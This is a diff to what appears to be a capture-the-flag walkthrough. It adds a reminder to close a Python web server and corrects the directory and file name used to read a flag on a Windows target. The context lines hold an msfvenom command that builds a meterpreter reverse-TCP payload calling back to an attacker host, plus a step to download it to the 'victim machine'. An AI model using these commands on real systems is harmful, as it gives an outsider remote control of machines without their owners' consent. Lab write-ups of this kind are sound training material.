@@ -14,6 +14,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[HOST_IP] LPORT=443 -a x64
 python3 -m http.server 8080
 ```
 
+Don't forget to close it after using it.
+
 3 - Curl the file *meter64.exe* on your victim machine :
 
 ```
@@ -96,9 +98,9 @@ Now, you can navigate to the admin documents to have the flag :
 cd ..
 cd ..
 cd Users
-cd admin
+cd adminUser
 cd Documents
-cat flag2.txt
+cat flag2.txt.txt
 ```
 
 Congratulations !
